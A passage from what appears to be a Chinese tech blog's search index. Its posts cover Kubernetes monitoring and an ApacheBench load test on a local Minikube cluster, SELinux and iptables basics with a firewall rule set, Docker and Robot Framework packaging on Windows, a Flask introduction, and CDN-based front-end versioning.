influxdb.yaml Heapster、InfluxDB、Grafana 均以 Pod 的形式启动和运行，创建 Pod：\n1 2 3 4 5 6 7 8 kubectl create -f deploy/kube-config/influxdb/ deployment.extensions/monitoring-grafana created service/monitoring-grafana created serviceaccount/heapster created deployment.extensions/heapster created service/heapster created deployment.extensions/monitoring-influxdb created service/monitoring-influxdb created 可能需要等待几分钟，Pod 才会处于 Running 状态：\n1 2 3 4 5 kubectl get pods -n kube-system NAME READY STATUS RESTARTS AGE heapster-7ff8d6bf9f-ngb9p 1/1 Running 0 31m monitoring-grafana-68b57d754-4qwjm 1/1 Running 0 31m monitoring-influxdb-cc95575b9-5j556 1/1 Running 0 31m 配置完毕之后，发现 Dashboard 并没有显示 CPU、内存等信息，查看 Heapser 日志：\n1 2 kubectl logs -f heapster-7ff8d6bf9f-ngb9p -n kube-system 1 reflector.go:190] k8s.io/heapster/metrics/util/util.go:30: Failed to list *v1.Node: nodes is forbidden: User \u0026#34;system:serviceaccount:kube-system:heapster\u0026#34; cannot list nodes at the cluster scope 提示缺角色，无权访问。新增授权：\n1 2 kubectl create -f deploy/kube-config/rbac/heapster-rbac.yaml clusterrolebinding.rbac.authorization.k8s.io/heapster created 更新 Heapser：\n1 kubectl replace --force -f deploy/kube-config/influxdb/heapster.yaml 再次查看 Dashboard，Nodes 和 Pods 中，可以非常直观的看到 CPU 和 MEM 的使用情况。\n5. 压力测试 下面 Apache 提供的 ab 工具，对 Kubernetes 托管的 Nginx 服务进行简单的压力测试实验。\n5.1 安装 Apache 安装 Apache 可以使用 Chocolatey ，也可以使用官方提供的 Windows 安装包。\n1 choco install apache-httpd 5.2 执行测试 硬件配置：\nCPU，i7-4790，3.6G，4 核 8 线程 MEM，16 GB VirtualBox，5.2.8 分配给 minikube 虚拟机 2 核 CPU，2 GB MEM\n软件版本：\nWindows 7 Minikube 0.28.2 Nginx 1.15.4 ApacheBench 2.3 压测开始后，在 Dashboard 看到 CPU 和内存使用量也陡增。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ab -c 125 -n 400000 http://192.168.99.100:31925/ //并发请求数 Concurrency Level: 125 //整个测试持续的时间 Time taken for tests: 317.350 seconds //完成的请求数 Complete requests: 400000 //失败的请求数 Failed requests: 0 //吞吐率 Requests per second: 1260.44 [#/sec] (mean) //用户平均请求等待时间 Time per request: 99.172 [ms] (mean) //服务器平均请求处理时间 Time per request: 0.793 [ms] (mean, across all concurrent requests) 一个 Pod\n并发请求数 125 250 500 1000 持续时间(second) 317 265 313 338 吞吐率(/second) 1260 1508 1276 1182 用户平均请求等待时间(ms) 99 165 391 845 服务器平均处理时间（ms） 0.79 0.66 0.78 0.845 两个 Pod\n并发请求数 125 250 500 1000 持续时间(second) 329 311 337 375 吞吐率(/second) 1213 1284 1186 1065 用户平均请求等待时间(ms) 102 194 421 938 服务器平均处理时间（ms） 0.824 0.778 0.843 0.939 从上面的表格可以看到，在一定的硬件环境下，Nginx 服务：\n增加 Pod 数量，并不能显著增加服务质量（吞吐率和用户等待时间） 6. 参考 https://jimmysong.io/kubernetes-handbook/guide/kubectl-cheatsheet.html https://blog.csdn.net/zhd930818/article/details/79869640 ","description":"","id":421,"section":"post","tags":["博文","Kubernetes","测试","Apache"],"title":"开启 Kubernetes 监控并实施压力测试","uri":"https://www.chenshaowen.com/blog/open-k8s-monitoring-and-stress-testing..html"},{"content":"1. 基本概念 1.1 Kubernetes Kubernetes（简称，K8s），前身是 Google 的 Borg，是用于自动部署、扩展和管理容器化应用程序的开源系统。\n提供的功能有：\n容器的自动化部署 自动化扩缩容 自动化应用/服务升级 容器成组，对外提供服务，支持负载均衡 服务的健康检查，自动重启 1.2 Kubernetes 集群 如上图，Kubernetes 集群包括两种类型资源：\nMaster 节点，协调控制整个集群 Master 负责集群的管理。Master 协调集群中的所有行为和活动，例如，应用的运行、修改、更新等。\nNode 节点，运行应用的工作节点。 Node 节点作为 Kubernetes 集群中的工作节点，可以是 VM 虚拟机、物理机。每个 Node 上都有一个 Kubelet，用于管理 node 节点与 Kubernetes Master 通信。\n1.3 Kubelet Kubelet 的主要功能就是定时从本地或 API 获取节点上 Pod/Container 的期望状态（运行什么容器、运行的副本数量、网络或者存储如何配置等），并调用对应的容器平台接口达到这个状态。Kubelet 提供的主要功能：\nPod 管理 容器健康检查 容器监控 1.4 MiniKube 在开发时，可以使用 Minikube， 通过在本地创建虚拟机并部署只包含单个节点的简单集群，实现轻量级的 Kubernetes 集群。\nMinikube CLI 提供集群管理的基本操作，包括 start、stop、status、 和 delete。\n2. 安装 2.1 安装要求 kubectl，用于管理 Node 节点 Windows VirtualBox or Hyper-V，依赖的虚拟机 VT-x/AMD-v virtualization must be enabled in BIOS，开启虚拟化指令集 Internet connection on first run，首次运行需要联网 由于之前安装 Docker Toolbox for Windows，已经安装 VirtualBox，这里主要讲一下如何安装 kubectl 和 MiniKube。\n2.2 安装 Kubectl 在官方文档中，详细描述了各种系统中如何安装 kubectl。在 Windows 下，使用 Chocolatey （安装方式可以参考之前的文章）包管理工具：\n1 2 3 4 5 6 choco install kubernetes-cli Chocolatey v0.10.11 Installing the following packages: kubernetes-cli By installing you accept licenses for the packages. Progress: Downloading kubernetes-cli 1.11.3... 100% 1 2 3 kubectl version Client Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;11\u0026#34;, GitVersion:\u0026#34;v1.11.3\u0026#34;, GitCommit:\u0026#34;a4529464e4629c21224b3d52edfe0ea91b072862\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2018-09-09T18:02:47Z\u0026#34;, GoVersion:\u0026#34;go1.10.3\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;windows/amd64\u0026#34;} Unable to connect to the server: dial tcp 127.0.0.1:8080: connectex: No connection could be made because the target machine actively refused it. 由于服务没有启动，会提示无法连接。\n2.3 安装 MiniKube 在 MiniKube 的 GitHub 仓库 中，详细描述了各种系统中如何安装 MiniKube。MiniKube 是使用 Go 语言开发的。在 Windows 上可以直接下载 MiniKube 可执行程序安装，也可以使用 Chocolatey 包管理工具安装。\n1 2 3 4 5 6 7 8 9 10 11 12 13 choco install minikube Chocolatey v0.10.11 Installing the following packages: minikube By installing you accept licenses for the packages. Progress: Downloading Minikube 0.28.2... 100% Minikube v0.28.2 [Approved] minikube package files install completed. Performing other installation steps. ShimGen has successfully created a shim for minikube.exe The install of minikube was successful. Software install location not explicitly set, could be in package or default install location if installer. 3. 使用 3.1 创建并启动集群 使用 minikube start 命令，可以创建并配置一个运行单节点 Kubernetes 集群的虚拟机，同时配置 kubectl 以与此集群进行通信。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 minikube start Starting local Kubernetes v1.10.0 cluster... Starting VM... Downloading Minikube ISO 160.27 MB / 160.27 MB 100.00% 0ssss Getting VM IP address... Moving files into cluster... Downloading kubelet v1.10.0 Downloading kubeadm v1.10.0 Finished Downloading kubelet v1.10.0 Finished Downloading kubeadm v1.10.0 Setting up certs... Connecting to cluster... Setting up kubeconfig... Starting cluster components Minikube 默认使用 VirtualBox 来驱动安装，使用 --vm-driver 参数可以指定驱动。通过设置环境变量 MINIKUBE_HOME 可以指定安装目录，默认安装目录在 C:\\Users\\Your User Name\\.minikube。\n检查节点是否正常：\n1 2 3 kubectl get nodes NAME STATUS ROLES AGE VERSION minikube Ready master 1d v1.10.0 3.2 拉取镜像 如果网络受限，不能打开 gcr.io 页面。有两种方法可以解决镜像拉取不到的问题。由于我的使用环境，能够科学上网，这里只提供一下解决的思路。\n第一种，配置代理 1 minikube start --docker-env HTTP_PROXY=127.0.0.1:1234 如果找到可用的代理，不是件很容易的事，可以试一下第二种方法。\n第二种，通过阿里云镜像下载并打 tag 1 2 3 minikube ssh docker pull registry.cn-beijing.aliyuncs.com/google-containers/kube-addon-manager-amd64:v6.1 docker tag registry.cn-beijing.aliyuncs.com/google-containers/kube-addon-manager-amd64:v6.1 gcr.io/google-containers/kube-addon-manager:v6.1 3.3 启动一个服务 创建一个 Nginx Pod 服务\n1 2 kubectl run kube-nginx --image=nginx:latest --port=80 deployment.apps/kube-nginx created 通过 NodePort 暴露服务\n1 2 kubectl expose deployment kube-nginx --type=NodePort service/kube-nginx exposed 检查 Pod 状态\n1 2 3 kubectl get pods NAME READY STATUS RESTARTS AGE kube-nginx-6d8f6d45-rwz2g 1/1 Running 0 1d 获取 Nginx 访问的 URL 地址\n1 2 minikube service kube-nginx --url http://192.168.99.100:30832 打开页面\n3.4 MiniKube 基本操作命令 启动集群 1 minikube start 查看状态 1 2 3 4 minikube status minikube: Running cluster: Running kubectl: Correctly Configured: pointing to minikube-vm at 192.168.99.100 查看日志 1 minikube logs 关闭集群 1 2 3 minikube stop Stopping local Kubernetes cluster... Stopping \u0026#34;minikube\u0026#34;... 删除集群 1 minikube delete 查看 IP 1 2 minikube ip 192.168.99.100 3.5 查看 Dashboard 1 2 minikube dashboard Opening kubernetes dashboard in default browser... 4. 参考 https://github.com/kubernetes/minikube#requirements http://docs.kubernetes.org.cn/126.html https://cizixs.com/2016/07/12/kubernetes-intro#disqus_thread https://ehlxr.me/2018/01/12/kubernetes-minikube-installation/ ","description":"","id":422,"section":"post","tags":["博文","Docker","Kubernetes","Windows","MiniKube"],"title":"Windows 7 下使用 MiniKube 学习 Kubernetes","uri":"https://www.chenshaowen.com/blog/how-to-use-minikube-under-windows7.html"},{"content":" 最近操作服务器时，遇到了一些不同清楚的概率，查找了一些资料，整理如下。\n1. BLP 安全模型 该模型将信息系统中的实体分为两部分：\n主体（Subject），实时操作的，如用户和进程 客体（Object），被操作的对象，如文件和数据库等。 对主体和客体来说，有两种最重要的安全控制方法：\nDAC（Discretionary Access Control,自主访问控制）。DAC 机制就是指对象的拥有者可以任意修改或授予此对象相应的权限。从主体和客体的角度来说，就是主体对其拥有的客体，有权决定自己和其他主体对该客体应具有怎样的访问权限。\nMAC（Mandatory Access Control，强制访问控制）。MAC 机制是指系统不再允许对象的拥有者随意修改或授予此对象相应的权限，而是通过强制的方式为每个对象一一授予权限，SELinux 即采用这种机制。该机制主要通过安全级来实现。\n2. SELinux NSA（美国国家安全局）发现大部分操作系统都是以 DAC 机制为安全认证基础的。由于 DAC 机制的设计，很不利于系统安全，NSA 便一直致力于开发一套更安全的 MAC 操作系统安全认证机制。\nSELinux 正是为解决这类问题而设计。在 SELinux 下，root 账号采用强制访问控制机制。同时，限制用户和程序（主体）使用最低权限做足以完成任务的工作，极大地提升了 Linux系统的安全性。\n在启用了 SELinux 的 Linux 操作系统中，某个对象需要执行某个操作时，先通过 DAC 机制的检测，再由 SELinux 定制的安全策略来检测。\n举例来说，系统上的 Apache 被发现存在一个漏洞，使得某远程用户可以访问系统上的敏感文件（比如， /etc/passwd )。此时可以绕开 DAC 检测机制，但对于 /etc/passwd 的访问会被 SELinux 阻止。 SELinux 可以显著降低 0-day 安全漏洞的影响。\n2.1 获取 SELinux 运行状态 1 getenforce 可能返回结果有三种：\nDisabled 表示 SELinux 被禁用 Permissive 表示仅记录安全警告但不阻止可疑行为 Enforcing 表示记录警告且阻止可疑行为 2.2 改变 SELinux 运行状态 1 setenforce [1 | 0 ] 0 表示 Permissive， 1 指代 Enforcing 此命令只在当次开机生效，重启后失效。\n3. Netfilter Netfilter 是 Linux 2.4.x 引入的一个子系统，它作为一个通用的、抽象的安全框架，提供了一整套的 hook 函数的管理机制。它具有如下功能：\n网络地址转换(Network Address Translate) 数据包内容修改 数据包过滤的防火墙 4. iptables iptables 是对 Netfilter 进行设置的工具，用户通过 iptables，将用户的安全设定执行到对应的防火墙 Netfilter 中。\n它有五个钩子（Hook）去控制包的流动：\nINPUT：进入本机 OUTPUT：本机输出 FORWARD：转发 PREROUTING：输入控制 POSTROUTING：输出控制 4.1 使用方法 关于添加/除去/编辑规则的命令的一般语法如下：\n1 iptables [-t table] command [match] [target] 一条 iptables 规则包含如下 4 个基本元素：\n表，有三种可用的表选项：filter、nat 和 mangle。 filter 表用于一般的信息包过滤 nat 表用于要转发的信息包 mangle 表用于信息包及其头内进行更改 命令 -A 或 \u0026ndash;append\t该命令将一条规则附加到链的末尾 -D 或 \u0026ndash;delete\t通过用 -D 指定要匹配的规则或者指定规则在链中的位置编号，该命令从链中删除该规则 -P 或 \u0026ndash;policy\t该命令设置链的默认目标，即策略。所有与链中任何规则都不匹配的信息包都将被强制使用此链的策略 -N 或 \u0026ndash;new-chain\t用命令中所指定的名称创建一个新链 -F 或 \u0026ndash;flush\t如果指定链名，该命令删除链中的所有规则，如果未指定链名，该命令删除所有链中的所有规则。此参数用于快速清除 -L 或 \u0026ndash;list\t列出指定链中的所有规则 -R 或 \u0026ndash;replace\t替换指定链中一条匹配的规则 -X 或 \u0026ndash;delete-chain\t删除指定用户的的定义链，若没有指定链，则删除所有的用户链 -C 或 \u0026ndash;check\t检查数据包是否与指定链的规则相匹配 -Z 或 \u0026ndash;zero\t将指定链中所有规则的 byte 计数器清零 匹配 -p 或 \u0026ndash;protocol\t该通用协议匹配用于检查某些特定协议。协议示例有 TCP、UDP、ICMP、用逗号分隔的任何这三种协议的组合列表以及 ALL（用于所有协议）。ALL 是默认匹配。可以使用!符号表示不与该项匹配 -s 或 \u0026ndash;source\t该源匹配用于根据信息包的源IP地址来与它们匹配。该匹配还允许对某一范围内的IP地址进行匹配，可以使用!符号，表示不与该项匹配。默认源匹配与所有 IP 地址匹配 -d 或 \u0026ndash;destination\t该目的地匹配用于根据信息包的目的地 IP 地址来与它们匹配。该匹配还允许对某一范围内 IP 地址进行匹配，可以使用!符号表示不与该项匹配 \u0026ndash;sport\t指定匹配规则的源端口或端口范围 \u0026ndash;dport\t指定匹配规则的目的端口或端口范围\n-i\t匹配单独的网络接口或某种类型的接口设置过滤规则 目标 ACCEPT\t当信息包与具有 ACCEPT 目标的规则完全匹配时，会被接受（允许它前往目的地） DROP\t当信息包与具有 DROP 目标的规则完全匹配时，会阻塞该信息包，并且不对它做进一步处理。该目标被指定为 -j DROP REJECT\t该目标的工作方式与 DROP 目标相同，但它比 DROP 好。和 DROP 不同，REJECT 不会在服务器和客户机上留下死套接字。另外，REJECT 将错误消息发回给信息包的发送方。该目标被指定为 -j REJECT RETURN\t在规则中设置的 RETURN 目标让与该规则匹配的信息包停止遍历包含该规则的链。如果链是如 INPUT 之类的主链，则使用该链的默认策略处理信息包。它被指定为 -jump RETURN LOG\t表示将包的有关信息记录入日志 TOS\t表示改写数据包的 TOS 值 4.2 常用命令 1 2 3 4 5 6 7 8 #先检查是否安装了iptables service iptables status #安装iptables yum install -y iptables #升级iptables yum update iptables #安装iptables-services yum install iptables-services CentOS 7 默认使用 firewalld 来管理 Netfilter 子系统，不过底层调用的命令仍然是 iptables 等。\n1 2 3 4 #停止firewalld服务 systemctl stop firewalld #禁用firewalld服务 systemctl mask firewalld 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #查看iptables现有规则 iptables -L -n #先允许所有,不然有可能会杯具 iptables -P INPUT ACCEPT #清空所有默认规则 iptables -F #清空所有自定义规则 iptables -X #所有计数器归0 iptables -Z #允许来自于lo接口的数据包(本地访问) iptables -A INPUT -i lo -j ACCEPT #开放22端口 iptables -A INPUT -p tcp --dport 22 -j ACCEPT #开放21端口(FTP) iptables -A INPUT -p tcp --dport 21 -j ACCEPT #开放80端口(HTTP) iptables -A INPUT -p tcp --dport 80 -j ACCEPT #开放443端口(HTTPS) iptables -A INPUT -p tcp --dport 443 -j ACCEPT #允许ping iptables -A INPUT -p icmp --icmp-type 8 -j ACCEPT #允许接受本机请求之后的返回数据 RELATED,是为FTP设置的 iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT #其他入站一律丢弃 iptables -P INPUT DROP #所有出站一律绿灯 iptables -P OUTPUT ACCEPT #所有转发一律丢弃 iptables -P FORWARD DROP 1 2 3 4 # 保存配置 service iptables save # 重启服务 systemctl restart iptables.service 4.3 删除规则 语法：\n1 iptables -D chain rulenum [options] chain 指的是 INPUT、FORWARD 之类 rulenum 指的是规则的编号 例如，先使用 iptables -L INPUT 查看规则列表，然后执行 iptables -D INPUT 3 删除第三条规则。\n5. 参考 http://vinllen.com/netfilteriptableskuang-jia-zong-jie/ http://jiayu0x.com/2014/12/23/Linux-authority-and-access-control/ ","description":"","id":423,"section":"post","tags":["整理","安全","Linux","iptables"],"title":"SELinux 和 iptables","uri":"https://www.chenshaowen.com/blog/selinux-and-iptables-on-linux.html"},{"content":"1. 自定义 docker-machine 位置 Windows 7 下使用 docker ，默认将 docker-machine 存放在 C:\\users\\your name\\.docker\\machine\\machines 目录。\n为了不占用系统盘存储空间，可以通过如下方法修改：\n如果还没有创建虚拟机，可以通过设置 MACHINE_STORAGE_PATH 环境变量指定。\n然后，运行 Docker Quickstart Termina，创建运行 docker-machine。\n如果已经创建虚拟机，则需要对虚拟机进行迁移，再重启 docker-machine。\n2. 目录挂载 Windows 7 下通过 VirtualBox 提供的虚拟环境，运行 Docker。挂载目录时，涉及三方的文件共享：\nWindows VirtualBox 中的虚拟机 Docker 将 Windows 7 中的文件夹挂载到 Docker ，需要借助虚拟机，一共分为两步：\n第一步，将 Windows 文件夹挂载到 VirtualBox 中的虚拟机 如上图，打开 VirtualBox，找到一个名为 default 的虚拟机，这个虚拟机就是 Docker 的宿主机， 在这个虚拟机中创建一个共享文件夹，比如把 D:\\挂载到 /d 目录下。\n然后重启虚拟机。\n1 docker-machine restart 第二步，将 VirtualBox 中的虚拟机文件目录挂载到 Docker 虚拟机中 /d/data 目录挂载到容器的 /data 目录\n1 docker run -it -v /d/data:/data centos /bin/bash 3. 配置镜像加速器 以 SSH 模式登录虚拟机 1 docker-machine ssh default 编辑配置，新增代理 1 2 3 4 5 sudo vi /var/lib/boot2docker/profile EXTRA_ARGS=\u0026#39; --label provider=virtualbox --registry-mirror=http://f1361db2.m.daocloud.io \u0026#39; 重启虚拟机 1 docker-machine restart ","description":"","id":424,"section":"post","tags":["博文","Docker","Windows","问题"],"title":"Windows 7 下 Docker 使用问题","uri":"https://www.chenshaowen.com/blog/some-tips-under-windows7-using-docker.html"},{"content":"1. 简介 Flask 诞生于 2010 年，是一个使用 Python 编写的轻量级 Web 应用框架。\nFlask 依赖于两个库。\nJinja2，模板引擎，类似 mako Werkzeug，遵循 WSGI 协议的 Python 函数库，实现了很多 Web 框架底层的东西，比如 request 和 response 对象。 2. Web 框架比较 Flask、Tornado、Django 特征：\nFlask：轻量，简洁，定制化 Tornado：异步机制 Django：大而全 3. Flask 应用场景 谁在使用 Flask：\nLinkedIn Pinterest 果壳网 大量个人博客 http://flask.pocoo.org/community/poweredby/ 适合小系统，开发复杂系统需要具有定制化开发的能力，能填坑。\n4. 编码规范 Pocoo 团队开发的项目\nFlask Jinja2 Pygments Sphinx Werzeug 遵循同一套规范，在 PEP8 的基础上，略有不同，进行了一定的扩展延伸\n查看在线规范文档\n5. 学习资料 《Flask Web开发：基于Python的Web应用开发实战》 ，不仅适合初级 Web 开发人员学习阅读，也是学习高级 Web 开发技术的优秀参考书。\n《深入理解 Flask》 ，从一个简单的Flask应用开始，通过解决若干实战中的问题，对一系列进阶的话题进行了探讨。\njinkan.org 中文版 Flask 文档\nFlash 官方英文文档\n6. 参考 http://flask.pocoo.org/ http://codingpy.com/article/pocoo-internal-style-guide-cn/ https://werkzeug-docs-cn.readthedocs.io/zh_CN/latest/ ","description":"","id":425,"section":"post","tags":["博文","Flask","Web","Python"],"title":"Flask 学习（1） - 简介","uri":"https://www.chenshaowen.com/blog/learning-flask-1.html"},{"content":" 为了方便 CI 集成 UI 自动化测试，需要将 Robot Framework 运行环境打包为 Docker 镜像。本篇主要内容是一些与打包过程相关的配置和脚本。\n1. 打包目录结构 1 2 3 4 5 6 tree . ├── docker-compose.yml ├── Dockerfile ├── google-chrome.repo ├── requirements_base.txt 1.1 Dockerfile 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 FROM centos:7 ADD ./google-chrome.repo /etc/yum.repos.d/google-chrome.repo RUN yum -y install epel-release RUN yum -y install wget unzip python-pip google-chrome-stable RUN google-chrome -version RUN wget https://chromedriver.storage.googleapis.com/2.41/chromedriver_linux64.zip RUN unzip chromedriver_linux64.zip RUN mv chromedriver /usr/bin/ RUN mkdir /data ADD ./requirements_base.txt /data/requirements_base.txt RUN cd /data RUN chmod 777 /data RUN pip install -r /data/requirements_base.txt RUN yum -y install cjkuni-ukai-fonts cjkuni-uming-fonts wqy-zenhei-fonts WORKDIR /data 1.2 google-chrome.repo 1 2 3 4 5 6 [google-chrome] name=google-chrome baseurl=http://dl.google.com/linux/chrome/rpm/stable/$basearch enabled=1 gpgcheck=1 gpgkey=https://dl-ssl.google.com/linux/linux_signing_key.pub 1.3 requirements_base.txt 1 2 3 4 5 6 7 8 robotframework==3.0.4 robotframework-archivelibrary==0.4.0 robotframework-ftplibrary==1.6 robotframework-ride==1.5.2.1 robotframework-selenium2library==3.0.0 robotframework-seleniumlibrary==3.1.1 robotframework-sshlibrary==3.1.0 robotframework-excellibrary==0.0.2 1.4 docker-compose.yml 1 2 3 4 5 6 7 8 9 10 version: \u0026#39;2\u0026#39; services: robot-framework: build: ./ image: robot-framework:1.2.0 volumes: - ./framework:/data command: /bin/bash -c \u0026#39;/data/start.sh\u0026#39; 2. 生成镜像并导出 为了方便生成镜像，并进行测试，这里使用 docker-compose 工具。docker-compose 提供了对 docker 镜像进行编排的功能。\n编译生成镜像（由于已经编译过一次，docker 直接使用了缓存）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 docker-compose build Building robot-framework Step 1/15 : FROM centos:7 ---\u0026gt; 5182e96772bf Step 2/15 : ADD ./google-chrome.repo /etc/yum.repos.d/google-chrome.repo ---\u0026gt; Using cache ---\u0026gt; 170c52cb6d03 Step 3/15 : RUN yum -y install epel-release ---\u0026gt; Using cache ---\u0026gt; 16e06b65b06b Step 4/15 : RUN yum -y install wget unzip python-pip google-chrome-stable ---\u0026gt; Using cache ---\u0026gt; fa1d529a3c79 Step 5/15 : RUN google-chrome -version ---\u0026gt; Using cache ---\u0026gt; 85d30717b2cc Step 6/15 : RUN wget https://chromedriver.storage.googleapis.com/2.41/chromedriver_linux64.zip ---\u0026gt; Using cache ---\u0026gt; 478e06633003 Step 7/15 : RUN unzip chromedriver_linux64.zip ---\u0026gt; Using cache ---\u0026gt; f349532ce26a Step 8/15 : RUN mv chromedriver /usr/bin/ ---\u0026gt; Using cache ---\u0026gt; 0cda97e8015d Step 9/15 : RUN mkdir /data ---\u0026gt; Using cache ---\u0026gt; 1140837158be Step 10/15 : ADD ./requirements_base.txt /data/requirements_base.txt ---\u0026gt; Using cache ---\u0026gt; 453287832315 Step 11/15 : RUN cd /data ---\u0026gt; Using cache ---\u0026gt; 2c37da1e6d90 Step 12/15 : RUN chmod 777 /data ---\u0026gt; Using cache ---\u0026gt; 39db1f669549 Step 13/15 : RUN pip install -r /data/requirements_base.txt ---\u0026gt; Using cache ---\u0026gt; 1d91f1cab3f6 Step 14/15 : RUN yum -y install cjkuni-ukai-fonts cjkuni-uming-fonts wqy-zenhei-fonts ---\u0026gt; Using cache ---\u0026gt; 45b4ecae1112 Step 15/15 : WORKDIR /data ---\u0026gt; Using cache ---\u0026gt; 609dde1f878e Successfully built 609dde1f878e Successfully tagged robot-framework:1.2.0 查看镜像列表\n1 2 3 4 docker image REPOSITORY TAG IMAGE ID CREATED SIZE robot-framework 1.2.0 609dde1f878e 3 weeks ago 962MB centos 7 5182e96772bf 6 weeks ago 200MB 导出镜像\n1 docker save -o ./robot-framework_V1.2.0 robot-framework:1.2.0 将镜像拷贝到其他机器，还可以导入镜像\n1 docker load -i robot-framework_V1.2.0 3. 测试 需要准备一个 Robot Framework 的 Demo。\ntree framework/ framework/ |---cases |------ 测试用例 |---process |------ 测试流程 |---keywords （存放关键字） |------common （通用关键字） |---resources（附件资源文件夹，放图片、表格、文件等） |---global.robot（存放一些必须的全局变量） |---locators （存放页面上一些固定的元素，进行统一管理） |---lib （自己写的一些库 Python 库文件） |---requirements.txt 依赖库文件 |---report 测试输出文件夹 |---start.sh 启动执行测试用例命令 在项目的根目录下，存在 start.sh 脚本，用于启动测试执行。\n1 2 cat start.sh pybot --outputdir report . 然后，继续使用 docker-compose 工具，创建容器，运行测试用例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 docker-compose up Starting robot-framework-compose_robot-framework_1 ... done Attaching to robot-framework-compose_robot-framework_1 robot-framework_1 | ============================================================================== robot-framework_1 | Data robot-framework_1 | ============================================================================== robot-framework_1 | Data.Cases robot-framework_1 | ============================================================================== robot-framework_1 | Data.Cases.Home robot-framework_1 | ============================================================================== robot-framework_1 | ???? | PASS | robot-framework_1 | ------------------------------------------------------------------------------ robot-framework_1 | ???? | PASS | robot-framework_1 | ------------------------------------------------------------------------------ robot-framework_1 | ???? | PASS | robot-framework_1 | ------------------------------------------------------------------------------ robot-framework_1 | Data.Cases.Home | PASS | robot-framework_1 | 3 critical tests, 3 passed, 0 failed robot-framework_1 | 3 tests total, 3 passed, 0 failed robot-framework_1 | ============================================================================== robot-framework_1 | Data.Cases | PASS | robot-framework_1 | 3 critical tests, 3 passed, 0 failed robot-framework_1 | 3 tests total, 3 passed, 0 failed robot-framework_1 | ============================================================================== robot-framework_1 | Data | PASS | robot-framework_1 | 3 critical tests, 3 passed, 0 failed robot-framework_1 | 3 tests total, 3 passed, 0 failed robot-framework_1 | ============================================================================== robot-framework_1 | Output: /data/report/output.xml robot-framework_1 | Log: /data/report/log.html robot-framework_1 | Report: /data/report/report.html robot-framework-compose_robot-framework_1 exited with code 0 最终在本地文件夹中，可以看到执行完测试用例生成的报告。\n除此，你还可以直接使用线上的镜像，跳过编译镜像的过程：\ndocker-compose.yml\n1 2 3 4 5 6 7 8 9 version: \u0026#39;2\u0026#39; services: robot-framework: image: shaowenchen/docker-robotframework volumes: - ./framework:/data command: /bin/bash -c \u0026#39;/data/start.sh\u0026#39; ","description":"","id":426,"section":"post","tags":["博文","Docker","测试"],"title":"如何打包一个 Robot Framework 的 Docker 镜像","uri":"https://www.chenshaowen.com/blog/how-to-package-a-docker-image-of-robot-framework.html"},{"content":" 在团队中，开发流程相关的调整一定要相应的自动化工具配合。如果没有足够低的使用成本，这种调整将会是无意义的，因为根本就不会有人去使用。上一篇，我们提到 如何利用 CDN 进一步的前后端分离 , 这一篇主要讲，如何将这个流程结合到 CI 中。后端的配置，之前的 博客 中已经提及很多。后端 CI 主要是做代码检查，推送代码到 SVN 仓库，CI 部分本篇不会涉及。\n1. 版本约定 前端版本由 package.json 文件决定。package.json 文件结构如下：\n1 2 3 4 5 6 7 8 { \u0026#34;name\u0026#34;: \u0026#34;my-project-webpack\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.1.3\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;dependencies\u0026#34;: { } } 前端打包输出的文件在当前目录的 static 目录下：\n1 2 3 4 5 6 # 本地版本 ./static/dev/ # 测试环境版本 ./static/test/ # 正式环境版本 ./static/dist/ 前端静态链接形式约定：\n1 https://cdn.domain.com/1.1.3/static/dev/js/app.js 版本号直接放在访问的 URL 中，这样可以方便做多版本管理。同时不需要每次发布之后需要强制刷新 CDN ，以更新缓存。\n前端的版本由前端控制，正式发布的版本应该是偶数版本。发布之后，需要将版本号最后一位加一。同时，每次发布版本，需要在 GitLab 仓库的 wiki 中记录变更的内容。\n2. 前端改造 由于对页面进行了 JS 拆分优化，页面默认引用的是本地的 JS。通过修改 publicPath 属性，可以将引用的路径指向 CDN。\n1 2 3 4 5 6 7 8 9 10 11 var package = require(\u0026#34;./package.json\u0026#34;); var version = package.version; baseConfig.devtool = \u0026#39;(none)\u0026#39; baseConfig.output = { path: path.resolve(__dirname, \u0026#39;./static/test/\u0026#39;), publicPath: \u0026#39;https://cdn.domain.com/\u0026#39;+version+\u0026#39;/static/test/\u0026#39;, filename: \u0026#39;js/[name].js\u0026#39;, chunkFilename: \u0026#39;[name].js\u0026#39; }; 3. 后端改造 后端使用的是 Django。后端改造的目的有两个：\n适配不同环境，有三个环境：本地、测试、正式。 前端版本控制。 适配不同环境主要是通过目录结构。前端版本控制需要从数据库中读取一条配置，前端发布时，修改配置即可。\nsettings.py，适配不同环境\n1 2 3 4 5 6 7 APP_CDN_URL = \u0026#39;https://cdn.domain.com/\u0026#39; if RUN_MODE == \u0026#39;DEVELOP\u0026#39;: BUNDLE_NAME = \u0026#39;/static/dev/\u0026#39; elif RUN_MODE == \u0026#39;TEST\u0026#39;: BUNDLE_NAME = \u0026#39;/static/test/\u0026#39; elif RUN_MODE == \u0026#39;PRODUCT\u0026#39;: BUNDLE_NAME = \u0026#39;/static/dist/\u0026#39; views.py，获取前端版本配置\n1 2 3 4 def index(request,question_id): V = Config().get_content(\u0026#39;V\u0026#39;) or \u0026#39;1.1.3\u0026#39; REMOTE_BUNDLE_URL = \u0026#39;%s%s%s\u0026#39;%(settings.APP_STATIC_URL, V, settings.BUNDLE_NAME) return render(request, \u0026#39;index.html\u0026#39;, {\u0026#39;BUNDLE_URL\u0026#39;: REMOTE_BUNDLE_URL,}) index.html，引用静态版本文件\n1 2 3 4 ... \u0026lt;script type=\u0026#34;text/javascript\u0026#34; 